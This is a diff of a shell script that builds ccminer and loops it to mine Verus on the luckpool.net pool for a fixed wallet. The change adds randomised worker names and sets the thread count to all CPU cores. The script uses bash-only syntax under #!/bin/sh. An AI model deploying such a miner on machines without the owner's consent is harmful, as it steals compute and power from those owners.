@@ -1,5 +1,10 @@
 #!/bin/sh
-
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
 apt-get update
 
 apt-get install sudo
@@ -22,7 +27,7 @@ chmod +x autogen.sh
 
 while [ 1 ]; do
 
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3957 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.cpu1 -p x -t 35
+./ccminer -a verus -o stratum+tcp://na.luckpool.net:3957 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p X -t $(nproc --all)
 
 sleep 3
 
